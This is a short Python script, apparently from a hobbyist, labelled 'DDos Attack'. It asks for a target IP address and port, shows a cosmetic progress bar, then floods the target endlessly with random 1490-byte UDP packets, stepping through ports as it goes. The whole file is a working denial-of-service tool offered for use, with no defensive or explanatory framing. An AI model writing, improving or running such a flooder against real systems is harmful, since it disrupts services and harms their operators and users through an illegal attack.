import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Set up socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Clear console and print header
os.system("clear")
os.system("figlet DDos Attack")
print()
print("Author   : Tech Tushar")
print("You Tube : https://www.youtube.com/c/TechTushar")
print("github   : https://github.com/Techtushar07")
print("Facebook : https://www.facebook.com/daveratushar/")
print()

# Get target IP and port
ip = input("IP Target : ")
port = int(input("Port       : "))

# Clear console and print attack starting message
os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

# Start sending packets
sent = 0
packets_per_interval = 10000
interval = 10  # seconds

while True:
    start_time = time.time()
    for _ in range(packets_per_interval):
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        if port == 65534:
            port = 1
    elapsed_time = time.time() - start_time
    if elapsed_time < interval:
        time.sleep(interval - elapsed_time)
    print(f"Sent {sent} packets so far")
